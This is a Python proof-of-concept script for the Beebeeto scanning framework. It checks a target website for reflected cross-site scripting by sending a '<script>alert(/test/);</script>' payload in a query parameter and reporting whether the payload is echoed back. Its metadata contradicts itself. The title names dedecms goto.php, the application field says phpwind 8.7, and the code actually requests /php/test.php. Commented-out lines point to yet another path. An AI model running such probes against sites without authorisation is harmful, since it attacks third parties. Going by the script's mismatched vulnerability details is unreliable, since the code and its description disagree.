#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

# import urllib2
import requests
import sys

sys.path.append('../')
from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0068',
            'name': 'bbs.dedecms.com/goto.php url 跨站脚本漏洞 POC',
            'author': 'xinali',
            'create_date': '2015-11-03',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpwind',
            'vul_version': ['8.7'],
            'type': 'Cross Site Scripting',
            'tag': ['phpwind漏洞', 'xss漏洞', '跨站脚本漏洞', 'php'],
            'desc': 'N/A',
            'references': ['http://www.exploit-db.com/exploits/36435/',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        # url = args['options']['target'] + '/main/calendar/agenda_list.php'
        # url = args['options']['target'] + '/main/calendar/agenda_list.php'
        # verify_url = args['options']['target'] + '/goto.php?url=test"><script>alert(/test/)</script>'
        verify_url = args['options']['target']  + '/php/test.php?name=<script>alert(/test/);</script>'
        # request = urllib2.Request(verify_url)
        # response = urllib2.urlopen(request)
        response = requests.get(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        # content = response.read()
        content = response.content
        print content
        if "<script>alert(/test/);</script>" in content:
            args['success'] = True
            args['poc_ret']['xss_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
